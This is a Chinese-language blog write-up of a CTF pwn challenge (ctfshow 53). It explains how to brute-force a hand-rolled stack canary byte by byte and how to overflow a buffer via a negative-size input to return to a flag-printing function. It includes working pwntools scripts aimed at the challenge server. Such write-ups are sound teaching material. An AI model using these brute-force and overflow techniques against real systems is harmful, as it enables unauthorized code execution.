@@ -1,0 +1,525 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
+<meta name="theme-color" content="#222">
+<meta name="generator" content="Hexo 7.3.0">
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png">
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png">
+  <link rel="mask-icon" href="/images/logo.svg" color="#222">
+
+<link rel="stylesheet" href="/css/main.css">
+
+
+<link rel="stylesheet" href="/lib/font-awesome/css/all.min.css">
+
+<script id="hexo-configurations">
+    var NexT = window.NexT || {};
+    var CONFIG = {"hostname":"example.com","root":"/","scheme":"Muse","version":"7.8.0","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12,"onmobile":false},"copycode":{"enable":true,"show_result":true,"style":"default"},"back2top":{"enable":true,"sidebar":false,"scrollpercent":true},"bookmark":{"enable":false,"color":"#222","save":"auto"},"fancybox":false,"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"algolia":{"hits":{"per_page":10},"labels":{"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}},"localsearch":{"enable":true,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},"path":"search.xml"};
+  </script>
+
+  <meta name="description" content="ctfshow53（1）checksec 发现并没有开canary保护，其实这道题只是在栈上放了一个作用与canary类似的，程序运行过程中也会比较它的值是否改变 思路：我们可以逐字节的将canary爆破出来 （2）ida查看 看看Canary  意思就是先声明了一个指针变量  stream，打开canary.txt文件，如果没有这个文件就退出，如果有使用  fread 函数从打开的文件中读取 4">
+<meta property="og:type" content="article">
+<meta property="og:title" content="Canary爆破">
+<meta property="og:url" content="http://example.com/2025/01/25/Canary%E7%88%86%E7%A0%B4/index.html">
+<meta property="og:site_name" content="小小pwn">
+<meta property="og:description" content="ctfshow53（1）checksec 发现并没有开canary保护，其实这道题只是在栈上放了一个作用与canary类似的，程序运行过程中也会比较它的值是否改变 思路：我们可以逐字节的将canary爆破出来 （2）ida查看 看看Canary  意思就是先声明了一个指针变量  stream，打开canary.txt文件，如果没有这个文件就退出，如果有使用  fread 函数从打开的文件中读取 4">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="http://example.com/2025/01/25/Canary%E7%88%86%E7%A0%B4/image-20250125213308165.png">
+<meta property="og:image" content="http://example.com/2025/01/25/Canary%E7%88%86%E7%A0%B4/image-20250125213837949.png">
+<meta property="og:image" content="http://example.com/2025/01/25/Canary%E7%88%86%E7%A0%B4/image-20250125213943366.png">
+<meta property="og:image" content="http://example.com/2025/01/25/Canary%E7%88%86%E7%A0%B4/image-20250125214349626.png">
+<meta property="og:image" content="http://example.com/2025/01/25/Canary%E7%88%86%E7%A0%B4/image-20250125220303086.png">
+<meta property="og:image" content="http://example.com/2025/01/25/Canary%E7%88%86%E7%A0%B4/image-20250125220808158.png">
+<meta property="article:published_time" content="2025-01-25T13:28:17.000Z">
+<meta property="article:modified_time" content="2025-01-25T14:56:38.041Z">
+<meta property="article:author" content="和方煜">
+<meta property="article:tag" content="wp">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="http://example.com/2025/01/25/Canary%E7%88%86%E7%A0%B4/image-20250125213308165.png">
+
+<link rel="canonical" href="http://example.com/2025/01/25/Canary%E7%88%86%E7%A0%B4/">
+
+
+<script id="page-configurations">
+  // https://hexo.io/docs/variables.html
+  CONFIG.page = {
+    sidebar: "",
+    isHome : false,
+    isPost : true,
+    lang   : 'zh-CN'
+  };
+</script>
+
+  <title>Canary爆破 | 小小pwn</title>
+  
+
+
+
+
+
+
+  <noscript>
+  <style>
+  .use-motion .brand,
+  .use-motion .menu-item,
+  .sidebar-inner,
+  .use-motion .post-block,
+  .use-motion .pagination,
+  .use-motion .comments,
+  .use-motion .post-header,
+  .use-motion .post-body,
+  .use-motion .collection-header { opacity: initial; }
+
+  .use-motion .site-title,
+  .use-motion .site-subtitle {
+    opacity: initial;
+    top: initial;
+  }
+
+  .use-motion .logo-line-before i { left: initial; }
+  .use-motion .logo-line-after i { right: initial; }
+  </style>
+</noscript>
+
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage">
+  <div class="container use-motion">
+    <div class="headband"></div>
+
+    <header class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-container">
+  <div class="site-nav-toggle">
+    <div class="toggle" aria-label="切换导航栏">
+      <span class="toggle-line toggle-line-first"></span>
+      <span class="toggle-line toggle-line-middle"></span>
+      <span class="toggle-line toggle-line-last"></span>
+    </div>
+  </div>
+
+  <div class="site-meta">
+
+    <a href="/" class="brand" rel="start">
+      <span class="logo-line-before"><i></i></span>
+      <h1 class="site-title">小小pwn</h1>
+      <span class="logo-line-after"><i></i></span>
+    </a>
+  </div>
+
+  <div class="site-nav-right">
+    <div class="toggle popup-trigger">
+        <i class="fa fa-search fa-fw fa-lg"></i>
+    </div>
+  </div>
+</div>
+
+
+
+
+<nav class="site-nav">
+  <ul id="menu" class="main-menu menu">
+        <li class="menu-item menu-item-home">
+
+    <a href="/" rel="section"><i class="fa fa-home fa-fw"></i>首页</a>
+
+  </li>
+        <li class="menu-item menu-item-tags">
+
+    <a href="/tags/" rel="section"><i class="fa fa-tags fa-fw"></i>标签</a>
+
+  </li>
+        <li class="menu-item menu-item-categories">
+
+    <a href="/categories/" rel="section"><i class="fa fa-th fa-fw"></i>分类</a>
+
+  </li>
+        <li class="menu-item menu-item-archives">
+
+    <a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>归档</a>
+
+  </li>
+      <li class="menu-item menu-item-search">
+        <a role="button" class="popup-trigger"><i class="fa fa-search fa-fw"></i>搜索
+        </a>
+      </li>
+  </ul>
+</nav>
+
+
+
+  <div class="search-pop-overlay">
+    <div class="popup search-popup">
+        <div class="search-header">
+  <span class="search-icon">
+    <i class="fa fa-search"></i>
+  </span>
+  <div class="search-input-container">
+    <input autocomplete="off" autocapitalize="off"
+           placeholder="搜索..." spellcheck="false"
+           type="search" class="search-input">
+  </div>
+  <span class="popup-btn-close">
+    <i class="fa fa-times-circle"></i>
+  </span>
+</div>
+<div id="search-result">
+  <div id="no-result">
+    <i class="fa fa-spinner fa-pulse fa-5x fa-fw"></i>
+  </div>
+</div>
+
+    </div>
+  </div>
+
+</div>
+    </header>
+
+    
+  <div class="back-to-top">
+    <i class="fa fa-arrow-up"></i>
+    <span>0%</span>
+  </div>
+
+
+    <main class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          
+
+          <div class="content post posts-expand">
+            
+
+    
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="http://example.com/2025/01/25/Canary%E7%88%86%E7%A0%B4/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.gif">
+      <meta itemprop="name" content="和方煜">
+      <meta itemprop="description" content="">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="小小pwn">
+    </span>
+      <header class="post-header">
+        <h1 class="post-title" itemprop="name headline">
+          Canary爆破
+        </h1>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-calendar"></i>
+              </span>
+              <span class="post-meta-item-text">发表于</span>
+              
+
+              <time title="创建时间：2025-01-25 21:28:17 / 修改时间：22:56:38" itemprop="dateCreated datePublished" datetime="2025-01-25T21:28:17+08:00">2025-01-25</time>
+            </span>
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-folder"></i>
+              </span>
+              <span class="post-meta-item-text">分类于</span>
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/%E7%AC%AC%E4%BA%8C%E5%91%A8/" itemprop="url" rel="index"><span itemprop="name">第二周</span></a>
+                </span>
+            </span>
+
+          
+            <span class="post-meta-item" title="阅读次数" id="busuanzi_container_page_pv" style="display: none;">
+              <span class="post-meta-item-icon">
+                <i class="fa fa-eye"></i>
+              </span>
+              <span class="post-meta-item-text">阅读次数：</span>
+              <span id="busuanzi_value_page_pv"></span>
+            </span><br>
+            <span class="post-meta-item" title="本文字数">
+              <span class="post-meta-item-icon">
+                <i class="far fa-file-word"></i>
+              </span>
+                <span class="post-meta-item-text">本文字数：</span>
+              <span>2.2k</span>
+            </span>
+            <span class="post-meta-item" title="阅读时长">
+              <span class="post-meta-item-icon">
+                <i class="far fa-clock"></i>
+              </span>
+                <span class="post-meta-item-text">阅读时长 &asymp;</span>
+              <span>2 分钟</span>
+            </span>
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+        <h1 id="ctfshow53"><a href="#ctfshow53" class="headerlink" title="ctfshow53"></a>ctfshow53</h1><h2 id="（1）checksec"><a href="#（1）checksec" class="headerlink" title="（1）checksec"></a>（1）checksec</h2><p><img src="/2025/01/25/Canary%E7%88%86%E7%A0%B4/image-20250125213308165.png" alt="image-20250125213308165"></p>
+<p>发现并没有开canary保护，其实这道题只是在栈上放了一个作用与canary类似的，程序运行过程中也会比较它的值是否改变</p>
+<p>思路：我们可以逐字节的将canary爆破出来</p>
+<h2 id="（2）ida查看"><a href="#（2）ida查看" class="headerlink" title="（2）ida查看"></a>（2）ida查看</h2><p><img src="/2025/01/25/Canary%E7%88%86%E7%A0%B4/image-20250125213837949.png" alt="image-20250125213837949"></p>
+<p><strong>看看Canary</strong></p>
+<p><img src="/2025/01/25/Canary%E7%88%86%E7%A0%B4/image-20250125213943366.png" alt="image-20250125213943366"></p>
+<p>意思就是先声明了一个指针变量  stream，打开canary.txt文件，如果没有这个文件就退出，如果有使用  fread 函数从打开的文件中读取 4 个字节的数据存储在全局变量global_canary</p>
+<p><strong>看看ctfshow</strong></p>
+<p><img src="/2025/01/25/Canary%E7%88%86%E7%A0%B4/image-20250125214349626.png" alt="image-20250125214349626"></p>
+<p>  将global_canary赋给s1，然后是一个while循环， 使用read函数读取字符到v2中，直至遇到换行符 \n（ASCII码为10）停止，v5记录存储的个数，每当存储一次v5的值就+1，，然后使用  __isoc99_sscanf 函数将  v2 中的字符串转换为整数，并存储到  nbytes 中，nbytes为<code>size_t</code> 类型无符号型，当我们输入-1时候就会被解释为一个非常大的数（（通常是 <code>0xFFFFFFFF</code>，即 <code>size_t</code> 类型的最大值）），所以我们可以输入-1来绕过while循环，并且可以利用第二个read进行栈溢出</p>
+<p>最后if循环就是比较canary的值是否改变的，将s1的值与global_canary比较如果不一样输出””Error *** Stack Smashing Detected *** : Canary Value Incorrect!”并退出，一样的话输出”Where is the flag?”</p>
+<p><strong>最后flag</strong></p>
+<p><img src="/2025/01/25/Canary%E7%88%86%E7%A0%B4/image-20250125220303086.png" alt="image-20250125220303086"></p>
+<p>意思就是打开flag的文件，通过puts函数将flag的值输出</p>
+<h2 id="（3）思路"><a href="#（3）思路" class="headerlink" title="（3）思路"></a>（3）思路</h2><p><img src="/2025/01/25/Canary%E7%88%86%E7%A0%B4/image-20250125220808158.png" alt="image-20250125220808158"></p>
+<p>先将canary逐个字节爆破出来，然后通过栈溢出返回到flag的地址就可以</p>
+<h3 id="1-canary爆破"><a href="#1-canary爆破" class="headerlink" title="1.canary爆破"></a>1.canary爆破</h3><p>爆破canary s1中储存的就是canary的值，我们可以先覆盖0x20个数据覆盖到s1，然后一个字节一个字节的去覆盖s1的值，因为只覆盖一个字节，其他的不变，通过看puts函数输出的值判断是否覆盖正确，当第一个字节正确就把他记录下来，然后爆破第二个字节时，再将第一个字节输入进去再爆破第二个字节，依次类推，这里我们可以借助脚本去爆破,粘贴一个大佬写的脚本我来解释一下</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">canary = <span class="string">b&#x27;&#x27;</span>                                           <span class="comment">#定义canary</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">4</span>):                                     <span class="comment">#这里是两层循环，因为canary是四个字节所以外层循环4次</span></span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0x100</span>):                             <span class="comment">#这个循环尝试所有可能的字节值（从 0x00 到 0xFF）</span></span><br><span class="line">        p = remote(<span class="string">&#x27;pwn.challenge.ctf.show&#x27;</span>, <span class="number">28179</span>)      </span><br><span class="line">        p.sendlineafter(<span class="string">b&#x27;&gt;&#x27;</span>,<span class="string">b&#x27;200&#x27;</span>)                   <span class="comment">#200为用户名</span></span><br><span class="line">        payload = <span class="string">b&#x27;a&#x27;</span>*<span class="number">0x20</span> + canary + p8(j)           <span class="comment">#先覆盖0x20到canary，在覆盖已经试出来前几个字节canary的值，再加上                                                         要尝试的</span></span><br><span class="line">        p.sendafter(<span class="string">&#x27;$ &#x27;</span>, payload)                     </span><br><span class="line">        ans = <span class="built_in">str</span>(p.recv())                            <span class="comment">#将接收的的值转化为字符串赋值给ans</span></span><br><span class="line">        <span class="keyword">if</span> <span class="string">&quot;Canary Value Incorrect!&quot;</span> <span class="keyword">not</span> <span class="keyword">in</span> ans:       <span class="comment">#这个if循环是判断逐字节爆破的canary是否正确，我们知道错误就会输出                                                        Canary Value Incorrect!，如果我们接收到的数据中没有Canary Value                                                        Incorrect!就证明是正确的</span></span><br><span class="line">            canary += p8(j)                            <span class="comment">#将新爆破出来的值加到已经爆破出来的值的后面</span></span><br><span class="line">            <span class="built_in">print</span>(<span class="string">f&quot;NO:<span class="subst">&#123;i+<span class="number">1</span>&#125;</span>  <span class="subst">&#123;<span class="built_in">hex</span>(j)&#125;</span>&quot;</span>)               <span class="comment">#因为i是取0-3的整数，所以要+1才是canary的第几个值</span></span><br><span class="line">            <span class="keyword">break</span>                                      <span class="comment">#退出循环</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">f&quot;try again! <span class="subst">&#123;i&#125;</span>:<span class="subst">&#123;j&#125;</span>&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;canary: <span class="subst">&#123;<span class="built_in">hex</span>(u32(canary))&#125;</span>&quot;</span>)                   <span class="comment">#最后将canary的值转换为32位输出出来</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<h3 id="2-栈溢出"><a href="#2-栈溢出" class="headerlink" title="2.栈溢出"></a>2.栈溢出</h3><p><strong>exp</strong></p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">p=remote(<span class="string">&#x27;pwn.challenge.ctf.show&#x27;</span>,<span class="number">28179</span>)</span><br><span class="line">canary=<span class="number">0x21443633</span>                              <span class="comment">#canary上面爆破过了，我们直接输入就可以，前提是canary的值是固定的</span></span><br><span class="line">flag=<span class="number">0x08048696</span></span><br><span class="line">p.recvuntil(<span class="string">b&#x27;How many bytes do you want to write to the buffer?\n&gt;&#x27;</span>)  </span><br><span class="line">p.sendline(<span class="string">b&#x27;-1&#x27;</span>)                              <span class="comment">#绕过while循环，并使得可以借助read函数栈溢出</span></span><br><span class="line">p.recvuntil(<span class="string">b&#x27;$ &#x27;</span>)                            </span><br><span class="line">pay=<span class="string">b&#x27;a&#x27;</span>*<span class="number">0x20</span>+p32(canary)+<span class="string">b&#x27;a&#x27;</span>*(<span class="number">0xc</span>+<span class="number">0x4</span>)+p32(flag) <span class="comment">#payload=覆盖到s1+canary+覆盖到返回地址+返回地址</span></span><br><span class="line">p.sendline(pay)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
+
+<h2 id="参考文章"><a href="#参考文章" class="headerlink" title="参考文章"></a>参考文章</h2><p><a target="_blank" rel="noopener" href="https://blog.csdn.net/2302_77659150/article/details/143097969">ctfshowpwn 45 -＞ 90（已更新33）栈溢出_pwn59-CSDN博客</a></p>
+<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/2301_79880074/article/details/135883546">canary保护和pie保护的绕过_ctfshow pwn入门-CSDN博客</a></p>
+
+    </div>
+
+    
+    
+    
+
+      <footer class="post-footer">
+          <div class="post-tags">
+              <a href="/tags/wp/" rel="tag"># wp</a>
+          </div>
+
+        
+
+
+        
+    <div class="post-nav">
+      <div class="post-nav-item">
+    <a href="/2025/01/24/mprotect%E5%87%BD%E6%95%B0/" rel="prev" title="mprotect函数">
+      <i class="fa fa-chevron-left"></i> mprotect函数
+    </a></div>
+      <div class="post-nav-item"></div>
+    </div>
+      </footer>
+    
+  </article>
+  
+  
+  
+
+
+
+          </div>
+          
+
+<script>
+  window.addEventListener('tabs:register', () => {
+    let { activeClass } = CONFIG.comments;
+    if (CONFIG.comments.storage) {
+      activeClass = localStorage.getItem('comments_active') || activeClass;
+    }
+    if (activeClass) {
+      let activeTab = document.querySelector(`a[href="#comment-${activeClass}"]`);
+      if (activeTab) {
+        activeTab.click();
+      }
+    }
+  });
+  if (CONFIG.comments.storage) {
+    window.addEventListener('tabs:click', event => {
+      if (!event.target.matches('.tabs-comment .tab-content .tab-pane')) return;
+      let commentClass = event.target.classList[1];
+      localStorage.setItem('comments_active', commentClass);
+    });
+  }
+</script>
+
+        </div>
+          
+  
+  <div class="toggle sidebar-toggle">
+    <span class="toggle-line toggle-line-first"></span>
+    <span class="toggle-line toggle-line-middle"></span>
+    <span class="toggle-line toggle-line-last"></span>
+  </div>
+
+  <aside class="sidebar">
+    <div class="sidebar-inner">
+
+      <ul class="sidebar-nav motion-element">
+        <li class="sidebar-nav-toc">
+          文章目录
+        </li>
+        <li class="sidebar-nav-overview">
+          站点概览
+        </li>
+      </ul>
+
+      <!--noindex-->
+      <div class="post-toc-wrap sidebar-panel">
+          <div class="post-toc motion-element"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#ctfshow53"><span class="nav-number">1.</span> <span class="nav-text">ctfshow53</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#%EF%BC%881%EF%BC%89checksec"><span class="nav-number">1.1.</span> <span class="nav-text">（1）checksec</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%EF%BC%882%EF%BC%89ida%E6%9F%A5%E7%9C%8B"><span class="nav-number">1.2.</span> <span class="nav-text">（2）ida查看</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%EF%BC%883%EF%BC%89%E6%80%9D%E8%B7%AF"><span class="nav-number">1.3.</span> <span class="nav-text">（3）思路</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#1-canary%E7%88%86%E7%A0%B4"><span class="nav-number">1.3.1.</span> <span class="nav-text">1.canary爆破</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#2-%E6%A0%88%E6%BA%A2%E5%87%BA"><span class="nav-number">1.3.2.</span> <span class="nav-text">2.栈溢出</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%8F%82%E8%80%83%E6%96%87%E7%AB%A0"><span class="nav-number">1.4.</span> <span class="nav-text">参考文章</span></a></li></ol></li></ol></div>
+      </div>
+      <!--/noindex-->
+
+      <div class="site-overview-wrap sidebar-panel">
+        <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+  <p class="site-author-name" itemprop="name">和方煜</p>
+  <div class="site-description" itemprop="description"></div>
+</div>
+<div class="site-state-wrap motion-element">
+  <nav class="site-state">
+      <div class="site-state-item site-state-posts">
+          <a href="/archives/">
+        
+          <span class="site-state-item-count">8</span>
+          <span class="site-state-item-name">日志</span>
+        </a>
+      </div>
+      <div class="site-state-item site-state-categories">
+            <a href="/categories/">
+          
+        <span class="site-state-item-count">2</span>
+        <span class="site-state-item-name">分类</span></a>
+      </div>
+      <div class="site-state-item site-state-tags">
+            <a href="/tags/">
+          
+        <span class="site-state-item-count">2</span>
+        <span class="site-state-item-name">标签</span></a>
+      </div>
+  </nav>
+</div>
+
+
+
+      </div>
+
+    </div>
+  </aside>
+  <div id="sidebar-dimmer"></div>
+
+
+      </div>
+    </main>
+
+    <footer class="footer">
+      <div class="footer-inner">
+        
+
+        
+
+<div class="copyright">
+  
+  &copy; 
+  <span itemprop="copyrightYear">2025</span>
+  <span class="with-love">
+    <i class="fa fa-heart"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">和方煜</span>
+    <span class="post-meta-divider">|</span>
+    <span class="post-meta-item-icon">
+      <i class="fa fa-chart-area"></i>
+    </span>
+      <span class="post-meta-item-text">站点总字数：</span>
+    <span title="站点总字数">16k</span>
+    <span class="post-meta-divider">|</span>
+    <span class="post-meta-item-icon">
+      <i class="fa fa-coffee"></i>
+    </span>
+      <span class="post-meta-item-text">站点阅读时长 &asymp;</span>
+    <span title="站点阅读时长">14 分钟</span>
+</div>
+  <div class="powered-by">由 <a href="https://hexo.io/" class="theme-link" rel="noopener" target="_blank">Hexo</a> & <a href="https://muse.theme-next.org/" class="theme-link" rel="noopener" target="_blank">NexT.Muse</a> 强力驱动
+  </div>
+
+
+
+
+        
+<div class="busuanzi-count">
+  <script async src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+    <span class="post-meta-item" id="busuanzi_container_site_uv" style="display: none;">
+      <span class="post-meta-item-icon">
+        <i class="fa fa-user"></i>
+      </span>
+      <span class="site-uv" title="总访客量">
+        <span id="busuanzi_value_site_uv"></span>
+      </span>
+    </span>
+    <span class="post-meta-divider">|</span>
+    <span class="post-meta-item" id="busuanzi_container_site_pv" style="display: none;">
+      <span class="post-meta-item-icon">
+        <i class="fa fa-eye"></i>
+      </span>
+      <span class="site-pv" title="总访问量">
+        <span id="busuanzi_value_site_pv"></span>
+      </span>
+    </span>
+</div>
+
+
+
+
+
+
+
+
+      </div>
+    </footer>
+  </div>
+
+  
+  <script src="/lib/anime.min.js"></script>
+  <script src="/lib/velocity/velocity.min.js"></script>
+  <script src="/lib/velocity/velocity.ui.min.js"></script>
+
+<script src="/js/utils.js"></script>
+
+<script src="/js/motion.js"></script>
+
+
+<script src="/js/schemes/muse.js"></script>
+
+
+<script src="/js/next-boot.js"></script>
+
+
+
+
+  
+
+
+
+
+  
+<script src="/js/local-search.js"></script>
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+  
+
+</body>
+</html>
